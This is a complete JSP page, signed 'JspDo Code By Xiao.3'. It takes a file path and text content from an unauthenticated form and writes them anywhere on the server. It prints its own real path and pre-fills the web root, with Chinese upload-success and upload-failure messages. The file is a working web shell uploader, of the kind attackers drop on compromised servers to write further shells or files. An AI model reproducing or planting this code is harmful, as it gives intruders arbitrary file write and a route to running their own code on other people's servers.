<%@page contentType="text/html;charset=gb2312"%>
<%@page import="java.io.*,java.util.*,java.net.*"%>
<html>
  <head>
    <title>JspDo Code By Xiao.3</title>
    <style type="text/css">
    	body { color:red; font-size:12px; background-color:white; }
    </style>
  </head>
  <body>
  <%
  	if(request.getParameter("context")!=null)
  	{
  	String context=new String(request.getParameter("context").getBytes("ISO-8859-1"),"gb2312");
  	String path=new String(request.getParameter("path").getBytes("ISO-8859-1"),"gb2312");
  	OutputStream pt = null;
        try {
            pt = new FileOutputStream(path);
            pt.write(context.getBytes());
            out.println("<a href='"+request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+request.getRequestURI()+"'><font color='red' title='点击可以转到上传的文件页面!'>上传成功!</font></a>");
        } catch (FileNotFoundException ex2) {
            out.println("<font color='red'>上传失败!</font>");
        } catch (IOException ex) {
            out.println("<font color='red'>上传失败!</font>");
        } finally {
            try {
                pt.close();
            } catch (IOException ex3) {
                out.println("<font color='red'>上传失败!</font>");
            }
        }
	}
  %>
    <form name="frmUpload" method="post" action="">
    <font color="blue">本文件的路径:</font><%out.print(request.getRealPath(request.getServletPath())); %>
    <br>
    <br>
    <font color="blue">上传文件路径:</font><input type="text" size="70" name="path" value="<%out.print(getServletContext().getRealPath("/")); %>">
    <br>
    <br>
    上传文件内容:<textarea name="context" id="context" style="width: 51%; height: 150px;"></textarea>
    <br>
    <br>
    <input type="submit" name="btnSubmit" value="Upload">
    </form>
  </body>
</html>